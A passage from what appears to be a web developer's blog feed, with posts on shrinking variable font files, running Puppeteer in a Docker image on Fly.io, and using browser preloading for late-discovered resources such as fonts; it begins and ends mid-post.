srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/05/image-4.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/05/image-4.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/05/image-4.png 1600w, https://cms.macarthur.me/content/images/2023/05/image-4.png 1632w&quot; /&gt;&lt;figcaption&gt;network tab after loading font weights&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Loading the italic versions is where things got gross. It doubled both the HTTP request count and the asset size, &lt;strong&gt;totaling over 200kb of added page weight&lt;/strong&gt;. Blegh.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/05/image-5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1318&quot; height=&quot;794&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/05/image-5.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/05/image-5.png 1000w, https://cms.macarthur.me/content/images/2023/05/image-5.png 1318w&quot; /&gt;&lt;figcaption&gt;network tab after loading even more font weights&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Again, the average site (probably) doesn&apos;t need all of these. But if you&apos;re working with anything over a moderately complex blog, it&apos;s &lt;em&gt;really hard&lt;/em&gt; to determine which ones to exclude. Instead, it&apos;s easier on one&apos;s sanity to just load them all. There&apos;ll be more page weight, but at least you won&apos;t unexpectedly find some text lacking the correct font face.&lt;/p&gt;&lt;h2&gt;Giving Variable a Shot&lt;/h2&gt;&lt;p&gt;Switching over to the variable version of Open Sans was fairly straightforward, at least when doing so with Fontsource. Rather than importing all of those different files, it was reduced to just two. One for &quot;normal&quot; variations in weight, and one for italic. I&apos;m loading them directly within a &lt;code&gt;.astro&lt;/code&gt; file, so it looked like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;@import &apos;@fontsource-variable/open-sans&apos;;
@import &apos;@fontsource-variable/open-sans/wght-italic.css&apos;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I also needed to tweak the &lt;code&gt;font-family&lt;/code&gt; rule, noting that I&apos;m using the &quot;Variable&quot; version: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;body {
  font-family: &apos;Open Sans Variable&apos;, sans-serif;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But that was it. Simple switch, and I liked what I saw in the network tab. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/05/image-6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1532&quot; height=&quot;284&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/05/image-6.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/05/image-6.png 1000w, https://cms.macarthur.me/content/images/2023/05/image-6.png 1532w&quot; /&gt;&lt;figcaption&gt;network tab after loadiing variable fonts&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Less than half of what I was previously loading, and only two HTTP requests. Plus, those two files include &lt;strong&gt;every possible variation I&apos;d ever need&lt;/strong&gt;. Less cost, more value. &lt;/p&gt;&lt;p&gt;Unfortunately, it&apos;s not so easy for fonts that aren&apos;t hot &amp;amp; ready from providers like Fontsource. &lt;/p&gt;&lt;h2&gt;Be wary of just any variable font.&lt;/h2&gt;&lt;p&gt;Open Sans is slick, but I wanted to use something different for my production site: Inter. And since the project&apos;s easily accessible on GitHub (including a variable version), I thought I&apos;d try my hand at wiring things up from scratch, rather than relying on Fontsource. But this decision turned out to be a smidge more complicated. &lt;/p&gt;&lt;p&gt;Because of how flexible variable fonts can be, building them can mean those versions are significantly larger than you might expect, especially when they&apos;re not exclusively packaged for use on the web. When I loaded the entire variable version of Inter, it came to over&lt;strong&gt; 800kb&lt;/strong&gt; of added weight. 😱😱😱&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/05/image-2.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1180&quot; height=&quot;216&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/05/image-2.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/05/image-2.png 1000w, https://cms.macarthur.me/content/images/2023/05/image-2.png 1180w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;After reading into a bit more, it made some sense. That variable font contains every possible variation of several dimensions and a whole ton of glyphs I&apos;ll never use. I took it straight from the &lt;a href=&quot;https://github.com/rsms/inter?ref=cms.macarthur.me&quot;&gt;Inter project itself&lt;/a&gt;, which isn&apos;t optimized for web-specific use (including the format – &lt;code&gt;.woff2&lt;/code&gt; is typically the best format for fonts on the web these days). &lt;/p&gt;&lt;p&gt;But I wasn&apos;t out of luck, thanks to &lt;a href=&quot;https://thetrevorharmon.com/blog/how-to-prepare-and-use-variable-fonts-on-the-web/?ref=cms.macarthur.me&quot;&gt;a great article from Trevor Harmon&lt;/a&gt;, which references &lt;a href=&quot;https://michaeljherold.com/articles/creating-a-subset-font/?ref=cms.macarthur.me&quot;&gt;another from Michael J. Harold&lt;/a&gt;. These two introduced me to the idea of subsetting fonts (removing unneeded glyphs) and reformatting the file to &lt;code&gt;.woff2&lt;/code&gt; for even better compression. &lt;/p&gt;&lt;p&gt;With their help, I used &lt;a href=&quot;https://fonttools.readthedocs.io/en/latest/subset/?ref=cms.macarthur.me&quot;&gt;pyftsubset&lt;/a&gt;, a command line tool for subsetting fonts and spitting out the result in a given format. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;pyftsubset Inter.tff \
  --unicodes=&quot;U+0020-007F,U+00A0-00FF,U+0100-017F,U+2192&quot; \
  --layout-features=&quot;&quot; \
  --flavor=&quot;woff2&quot; \
  --output-file=&quot;inter-subset.woff2&quot;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As instructed by the article, that&apos;ll rip out any glyphs other than what&apos;s needed to write a blog post. And the result was satisfying:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/07/image-1.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1354&quot; height=&quot;238&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/07/image-1.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/07/image-1.png 1000w, https://cms.macarthur.me/content/images/2023/07/image-1.png 1354w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Down from over 800kb to&lt;strong&gt; 45.9kb&lt;/strong&gt;. And only one HTTP request my site needs to take on. I accept.&lt;/p&gt;&lt;h2&gt;Variable for Everything? &lt;/h2&gt;&lt;p&gt;In the short-term, probably not for &lt;em&gt;everything&lt;/em&gt;. Browser support certainly isn&apos;t an issue, but the font faces I&apos;d like when building a site aren&apos;t &lt;em&gt;always&lt;/em&gt; available in a variable version. If I&apos;m really keen on using a particular font, I&apos;ll either need to scourge the internet for a variable version and possibly mess with more subsetting, or settle for a static version that&apos;s ready to go. The latter is way easier. &lt;/p&gt;&lt;p&gt;Long-term, however, it might be more likely. The rate at which variable versions are available &amp;amp; web-ready from common sources (Fontsource, Google Fonts, etc.) is rapidly increasing (at least anecdotally). For example, I wanted to use Karla for &lt;a href=&quot;https://www.picperf.dev/?ref=cms.macarthur.me&quot;&gt;PicPerf.dev&lt;/a&gt;, and was very happy to see a variable version offered by Fontsource, as was the case for several other options I was considering. And it just worked. No problems. &lt;/p&gt;&lt;p&gt;The part of variable fonts I&apos;m more concerned with is my ability to use them effectively. There&apos;s a whole new world of CSS properties, technical concepts, and more out there on variable fonts that I&apos;m not remotely familiar with. If I&apos;m going to leverage them beyond the potential performance benefits, I&apos;ll need to spend some more time in the weeds as time goes on. And that&apos;s fine with me, because it&apos;ll probably produce fodder for more blog posts.&lt;/p&gt;</content:encoded></item><item><title>Run Puppeteer with Docker on Fly.io</title><link>https://macarthur.me/posts/puppeteer-with-docker</link><guid isPermaLink="true">https://macarthur.me/posts/puppeteer-with-docker</guid><pubDate>Sun, 09 Jul 2023 03:45:24 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;ve been building an &quot;analyzer&quot; tool for &lt;a href=&quot;https://www.picperf.dev/?ref=cms.macarthur.me&quot;&gt;PicPerf.dev&lt;/a&gt; (it&apos;s not live yet). Give it a URL, and you&apos;ll get a snapshot of how many kilobytes you could save by running your images through PicPerf.&lt;/p&gt;&lt;p&gt;The heavy lifting for the tool lives in a small Node application deployed on &lt;a href=&quot;https://fly.io/?ref=cms.macarthur.me&quot;&gt;Fly.io&lt;/a&gt;. To collect images from the provided page, I&apos;m using Google&apos;s Puppeteer to spin up headless browser, render the page, and extract the image URLs. Locally, it works fine. Deploying it, however, is more challenging. &lt;/p&gt;&lt;p&gt;Puppeteer requires a series of system-level dependencies in order to function, and you don&apos;t get them for free when running a Docker image. Without them, you&apos;ll get an error that resembles this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Could not find Chrome (ver. 114.0.5735.133). This can occur if either
 1. you did not perform an installation before running the script (e.g. `npm install`) or
 2. your cache path is incorrectly configured (which is: /root/.cache/puppeteer).
For (2), check out our guide on configuring puppeteer at https://pptr.dev/guides/configuration.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Because things were simple, I was allowing Fly to auto-detect my Node application, so I had no Dockerfile – running &lt;code&gt;fly deploy&lt;/code&gt; did everything I needed. But this meant I lacked these necessary Puppeteer dependencies. As a result, I decided to go the more fine-tuned, controlled Docker route. &lt;/p&gt;&lt;p&gt;To be clear, there&apos;s no shortage of results out there that help you Dockerize Puppeteer. But the ones I found were often no longer supported, relied on old versions of Node, or came bundled with other baggage I didn&apos;t want. And knowing that Fly is extremely Docker-friendly, starting with a more vanilla image and then tacking on more goodies was a much more attractive path. There didn&apos;t seem to be much help out there on that front, so you&apos;re getting this post.&lt;/p&gt;&lt;h2&gt;Generating a Dockerfile&lt;/h2&gt;&lt;p&gt;Being so Docker-friendly, Fly makes it really easy to generate a basic Dockerfile for a Node application. Let&apos;s kick it off by running the following:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;npx @flydotio/dockerfile &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;ll get you a basic Dockerfile from the &lt;a href=&quot;https://github.com/fly-apps/dockerfile-node?ref=cms.macarthur.me&quot;&gt;dockerfile-node&lt;/a&gt; project. At the time mine was generated, here&apos;s how it looked: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;# syntax = docker/dockerfile:1

# Adjust NODE_VERSION as desired
ARG NODE_VERSION=20.3.0
FROM node:${NODE_VERSION}-slim as base

LABEL fly_launch_runtime=&quot;Node.js&quot;

# Node.js app lives here
WORKDIR /app

# Set production environment
ENV NODE_ENV=production

# Throw-away build stage to reduce size of final image
FROM base as build

# Install packages needed to build node modules
RUN apt-get update -qq &amp;amp;&amp;amp; \
    apt-get install -y python-is-python3 pkg-config build-essential 

# Install node modules
COPY --link package-lock.json package.json ./
RUN npm ci --include=dev

# Copy application code
COPY --link . .

# Build application
RUN npm run build

# Remove development dependencies
RUN npm prune --omit=dev

# Final stage for app image
FROM base

# Copy built application
COPY --from=build /app /app

# Start the server by default, this can be overwritten at runtime
EXPOSE 3000
CMD [ &quot;npm&quot;, &quot;run&quot;, &quot;start&quot; ]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s fairly straightforward multi-stage setup: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;Start with a base Node image. &lt;/li&gt;&lt;li&gt;Install my dependencies &amp;amp; build the application code in a separate stage.&lt;/li&gt;&lt;li&gt;Dump that built code into a &quot;fresh&quot; stage.&lt;/li&gt;&lt;li&gt;Start the application. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The result is a slim container that only has what&apos;s needed to run the application.&lt;/p&gt;&lt;h2&gt;Finding Puppeteer&apos;s Dependencies&lt;/h2&gt;&lt;p&gt;Resources out there on which dependencies are required to run Puppeteer are inconsistent. It was confusing when I started digging in. Eventually, I realized that Puppeteer&apos;s documentation is already clear about what&apos;s needed.&lt;/p&gt;&lt;p&gt;On its &lt;a href=&quot;https://pptr.dev/troubleshooting?ref=cms.macarthur.me#running-puppeteer-in-docker&quot;&gt;troubleshooting page&lt;/a&gt;, there&apos;s an example Dockerfile that lists those dependencies. It&apos;s even on a Node base image similar to what I wanted, so it&apos;s ready to largely copy &amp;amp; paste. The most important piece is placing that copied portion into a particular stage of our Dockerfile.&lt;/p&gt;&lt;p&gt;If you look back, the final deployed stage inherits from &lt;code&gt;base&lt;/code&gt;. When it comes to the code needed for runtime, the &lt;code&gt;build&lt;/code&gt; stage has nothing to do with it. Its only purpose was to build the code and then be thrown away to keep the final image smaller. Here&apos;s a slimmer, annotated version of that file:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# syntax = docker/dockerfile:1

FROM node:20.3.0-slim as base

# Start with a plain Node image.

FROM base as build

# Install dependencies &amp;amp; build application code.

FROM base

# Copy the application code from `build` and start it up.
COPY --from=build /app /app

EXPOSE 3000
CMD [ &quot;npm&quot;, &quot;run&quot;, &quot;start&quot; ]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And that means I needed to install those dependencies either in the final stage or the initial &lt;code&gt;base&lt;/code&gt; stage. We&apos;re going with the latter: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;# syntax = docker/dockerfile:1

FROM node:20.3.0-slim as base

# Start with a plain Node image.

+ # Install latest chrome dev package and fonts to support major charsets (Chinese, Japanese, Arabic, Hebrew, Thai and a few others)
+ # Note: this installs the necessary libs to make the bundled version of Chrome that Puppeteer
+ # installs, work.
+ RUN apt-get update \
+     &amp;amp;&amp;amp; apt-get install -y wget gnupg \
+     &amp;amp;&amp;amp; wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | gpg --dearmor -o /usr/share/keyrings/googlechrome-linux-keyring.gpg \
+     &amp;amp;&amp;amp; sh -c &apos;echo &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/googlechrome-linux-keyring.gpg] http://dl.google.com/linux/chrome/deb/ stable main&quot; &amp;gt;&amp;gt; /etc/apt/sources.list.d/google.list&apos; \
+     &amp;amp;&amp;amp; apt-get update \
+     &amp;amp;&amp;amp; apt-get install -y google-chrome-stable fonts-ipafont-gothic fonts-wqy-zenhei fonts-thai-tlwg fonts-khmeros fonts-kacst fonts-freefont-ttf libxss1 \
+       --no-install-recommends \
+     &amp;amp;&amp;amp; rm -rf /var/lib/apt/lists/*

FROM base as build

# Install dependencies &amp;amp; build application code.

FROM base

# Copy the application code from `build` and start it up.
COPY --from=build /app /app

EXPOSE 3000
CMD [ &quot;npm&quot;, &quot;run&quot;, &quot;start&quot; ]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since the application is run in a stage inheriting from &lt;code&gt;base&lt;/code&gt;, we&apos;ll have those dependencies available when everything&apos;s deployed.&lt;/p&gt;&lt;h2&gt;No Need to Use Bundled Chromium&lt;/h2&gt;&lt;p&gt;You might&apos;ve noticed that &lt;code&gt;google-chrome-stable&lt;/code&gt; is being installed as a system dependency – the Linux version of Chrome ready to use inside the container. But since &lt;code&gt;puppeteer&lt;/code&gt; is a dependency in our &lt;code&gt;package.json&lt;/code&gt; file, it&apos;s actually downloading Chrome &lt;em&gt;twice.&lt;/em&gt;&lt;strong&gt; &lt;/strong&gt;Wasteful. &lt;/p&gt;&lt;p&gt;To use that Linux version and bypass a full download by the &lt;code&gt;puppeteer&lt;/code&gt; package itself, we can set this environment variable before &lt;code&gt;npm install&lt;/code&gt; is run: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;ENV PUPPETEER_SKIP_CHROMIUM_DOWNLOAD true&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then, when initializing a browser, the &lt;code&gt;executablePath&lt;/code&gt; is set to this installed version: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const browser = await puppeteer.launch({
	executablePath: &quot;/usr/bin/google-chrome&quot;,
	// ... other options
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;ll save a bit of build time, since Chrome will no longer be downloaded twice.&lt;/p&gt;&lt;h2&gt;Testing It&lt;/h2&gt;&lt;p&gt;It sucks to deploy something only to find out it still doesn&apos;t work. Because of that, let&apos;s build the image locally to try things out before shipping.&lt;/p&gt;&lt;p&gt;First, build it: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker build -t my-puppeteer-image .&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then, run it:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker run -p 3000:3000 my-puppeteer-image&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The application should be accessible at &lt;code&gt;http://localhost:3000&lt;/code&gt;, ready to run. Assuming you&apos;re running an HTTP service, sending a request should get you a successful response with no Puppeteer-related errors.&lt;/p&gt;&lt;h2&gt;Deploying It&lt;/h2&gt;&lt;p&gt;The easiest part (thanks, Fly). Run &lt;code&gt;fly deploy&lt;/code&gt;. Wait a bit. Then party.&lt;/p&gt;</content:encoded></item><item><title>How to Better Leverage Browser Preloading</title><link>https://macarthur.me/posts/effective-preloading</link><guid isPermaLink="true">https://macarthur.me/posts/effective-preloading</guid><pubDate>Sat, 24 Jun 2023 04:26:10 GMT</pubDate><content:encoded>&lt;p&gt;There&apos;s an abundance of browser tools that help you signal which assets have the highest or least priority when you&apos;re loading them for a page. Some have been around for quite a while, like the &lt;code&gt;async&lt;/code&gt; and &lt;code&gt;defer&lt;/code&gt; attributes on &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags. Others are still relatively new to the scene.&lt;/p&gt;&lt;p&gt;One of them is &lt;code&gt;&amp;lt;link rel=&quot;preload&quot;&amp;gt;&lt;/code&gt;. Introduced around 2016, preloading allows you to tell the browser that a specific resource will &lt;em&gt;definitely be used&lt;/em&gt; on the page, so it should go ahead and download it right now and with elevated priority.  &lt;/p&gt;&lt;p&gt;It&apos;s a great tool. But since its arrival, I&apos;ve seen a lot of this on various websites: preloading an asset already linked in the HTML.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
	&amp;lt;!-- other stuff --&amp;gt;
    
	&amp;lt;link rel=&quot;preload&quot; href=&quot;https://example.com/script.js&quot; as=&quot;script&quot;&amp;gt;
    &amp;lt;script src=&quot;https://example.com/script.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The rationale makes some sense. If a file is &lt;em&gt;critical&lt;/em&gt; to the experience of the page, there&apos;s an incentive to tell the browser it&apos;s &lt;em&gt;really important&lt;/em&gt; to prioritize it.&lt;/p&gt;&lt;p&gt;That &lt;em&gt;can&lt;/em&gt; be useful, but most of the time, &lt;strong&gt;you&apos;re wasting your time preloading stuff this way, &lt;/strong&gt;and probably lack some understanding of what preloading was mainly designed for. Let&apos;s explore.&lt;/p&gt;&lt;h2&gt;Loading Assets without Preloading&lt;/h2&gt;&lt;p&gt;I set up a simple HTML document with a few resources being loaded in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;, along with some images and a script in the &lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;. I was on a high-speed network connection (privilige not everyone has), so I also used Chrome&apos;s dev tools to throttle my connection speed down to &quot;fast 3G.&quot; Here&apos;s the markup I started with:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style.css&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style2.css&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style3.css&quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1201/1201&quot; /&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1202/1202&quot; /&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1203/1203&quot; /&amp;gt;
    &amp;lt;script src=&quot;http://localhost:8080/script.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The first CSS file also loads a &lt;code&gt;.woff2&lt;/code&gt; font file via a &lt;code&gt;@font-face&lt;/code&gt; rule, but obviously, only after it&apos;s been parsed by the browser.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;@font-face {
    font-family: &apos;Roboto&apos;;
    font-style: normal;
    font-weight: 400;
    src: url(http://localhost:8080/font.woff2) format(&apos;woff2&apos;);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On page load, resources begin to load fairly predictably, mostly in order of document position.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/06/image-12.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1802&quot; height=&quot;682&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/06/image-12.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/06/image-12.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/06/image-12.png 1600w, https://cms.macarthur.me/content/images/2023/06/image-12.png 1802w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Because they&apos;re embedded directly in the document itself, the majority load in &quot;medium&quot; to &quot;highest&quot; priority (more details on &lt;a href=&quot;https://docs.google.com/document/d/1bCDuq9H1ih9iNjgzyAL0gpwNFiEP4TZS-YLRp_RuMlc/edit?ref=cms.macarthur.me&quot;&gt;the distinction between those levels here&lt;/a&gt;). &lt;/p&gt;&lt;p&gt;That font is a bit special. &lt;a href=&quot;https://calendar.perfplanet.com/2022/http-3-prioritization-demystified/?ref=cms.macarthur.me&quot;&gt;Some browsers&lt;/a&gt; will load it with a &quot;medium&quot; priority out of the box, while Chrome goes with &quot;highest.&quot; But because I&apos;m emulating a slow connection, it &lt;a href=&quot;https://twitter.com/amacarthur/status/1710293068648173713?ref=cms.macarthur.me&quot;&gt;lowers that priority&lt;/a&gt; and uses a fallback font. &lt;/p&gt;&lt;p&gt;What&apos;s most interesting about this, however, is that despite being marked &quot;medium,&quot; our JavaScript begins loading &lt;em&gt;before&lt;/em&gt; any of the images. It&apos;s like the browser is up to something.&lt;/p&gt;&lt;h2&gt;The Impact of Preloading&lt;/h2&gt;&lt;p&gt;Now, let&apos;s revisit the idea of preloading a really important script already called on the page. We&apos;ll throw a new line in there, right at the top.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
+	&amp;lt;link rel=&quot;preload&quot; href=&quot;http://localhost:8080/script.js&quot; as=&quot;script&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style.css&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style2.css&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style3.css&quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1201/1201&quot; /&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1202/1202&quot; /&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1203/1203&quot; /&amp;gt;
    &amp;lt;script src=&quot;http://localhost:8080/script.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&apos;s how that network waterfall looks now: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/06/image-13.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1808&quot; height=&quot;696&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/06/image-13.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/06/image-13.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/06/image-13.png 1600w, https://cms.macarthur.me/content/images/2023/06/image-13.png 1808w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;By the looks of it, there&apos;s been &lt;em&gt;some&lt;/em&gt; impact. The script is now the first asset to begin downloading. But the benefit is marginal. You can&apos;t tell from the screenshot, but it started downloading a mere 16 milliseconds before the &lt;em&gt;last&lt;/em&gt; image did. And as you can see, the assets (except the sub-requested font) still appear to be loading concurrently. &lt;/p&gt;&lt;p&gt;But it&apos;s also graduated to &quot;high&quot; priority. That&apos;s good, but at the very least, you might&apos;ve expected the browser to make it&lt;em&gt; &quot;highest&quot;&lt;/em&gt; priority. Instead, our styles still get the top rank. Regardless of where it was placed in the document, the browser just seems to already know how to handle the resource relative to others&apos; positioning and type. There&apos;s a bit of benefit to preloading, but nothing impressive. Maybe even not worth bothering with at all.&lt;/p&gt;&lt;h2&gt;The Preload Scanner&apos;s on the Job&lt;/h2&gt;&lt;p&gt;If you&apos;re expecting huge gains from &lt;code&gt;rel=&quot;preload&quot;&lt;/code&gt; resources called in your HTML, you&apos;re setting yourself up for disappointment, &lt;strong&gt;because the browser is already good at what we often want &lt;code&gt;preload&lt;/code&gt; to do.&lt;/strong&gt; That&apos;s because of a built-in mechanism called the &quot;preload scanner.&quot; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://web.dev/preload-scanner/?ref=cms.macarthur.me#whats-a-preload-scanner&quot;&gt;The preload scanner&lt;/a&gt; is a secondary parser running while any document loads. Its purpose is to look ahead in the document, identifying any resources in the HTML that it can start fetching as soon as possible. That includes any sort of normal asset loaded via HTML tag – &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;, etc. &lt;/p&gt;&lt;p&gt;And that means that no matter where that &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag is placed, the browser will &lt;em&gt;always&lt;/em&gt; find it and &lt;em&gt;always&lt;/em&gt; give it reasonable priority when loading, contextual to the other assets it knows need to be loaded too.&lt;/p&gt;&lt;p&gt;Of course, that behavior assumes a few things: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;You&apos;re not using &lt;code&gt;defer&lt;/code&gt; or &lt;code&gt;async&lt;/code&gt; attributes.&lt;/li&gt;&lt;li&gt;The tag is embedded in the HTML itself (and not injected via JavaScript)&lt;/li&gt;&lt;li&gt;The HTML isn&apos;t rendered by a JavaScript framework, like React. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;So, the browser is smarter than you might think. But that doesn&apos;t mean preloading isn&apos;t an effective tool when used in a better way.&lt;/p&gt;&lt;h2&gt;Better Preloading: A Seeing Eye Dog for the Browser&lt;/h2&gt;&lt;p&gt;Rather than preloading assets already embedded in your HTML, a better use case is using it to prioritize resources that you &lt;em&gt;know&lt;/em&gt; will be needed later on, &lt;strong&gt;but are being requested by assets not yet loaded themselves&lt;/strong&gt; (you&apos;ll often see these referred to as &quot;late-discovered resources&quot;). Put another way, preloading can be thought of as a seeing eye dog to the brower&apos;s preload scanner. &lt;/p&gt;&lt;p&gt;A great example is our low-priority font file from above. Despite Chrome&apos;s attempt to be smart about it, we might want to enforce a higher priority, regardless of network speed. So, let&apos;s try preload it. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
+	&amp;lt;link rel=&quot;preload&quot; href=&quot;http://localhost:8080/font.woff2&quot; as=&quot;font&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style.css&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style2.css&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8080/style3.css&quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1201/1201&quot; /&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1202/1202&quot; /&amp;gt;
    &amp;lt;img src=&quot;https://placekitten.com/g/1203/1203&quot; /&amp;gt;
    &amp;lt;script src=&quot;http://localhost:8080/script.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, things look different. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/06/Screen-Shot-2023-06-22-at-10.23.26-PM.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1816&quot; height=&quot;750&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/06/Screen-Shot-2023-06-22-at-10.23.26-PM.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/06/Screen-Shot-2023-06-22-at-10.23.26-PM.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/06/Screen-Shot-2023-06-22-at-10.23.26-PM.png 1600w, https://cms.macarthur.me/content/images/2023/06/Screen-Shot-2023-06-22-at-10.23.26-PM.png 1816w&quot; /&gt;&lt;figcaption&gt;Despite being a sub-resource, our font now has elevated priority.&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The font file is now the &lt;em&gt;first&lt;/em&gt; resource to be fetched, and it has a &quot;high&quot; priority, giving a huge head start on downloading before it&apos;s actually needed. By the time that &quot;lowest&quot; priority font request hits, the file is already cached and ready to go. In this scenario, we&apos;re letting the preload scanner do what it does best, and leveraging preloading to let the browser know about the resources it can&apos;t yet see. &lt;/p&gt;&lt;h2&gt;Maximizing Preload 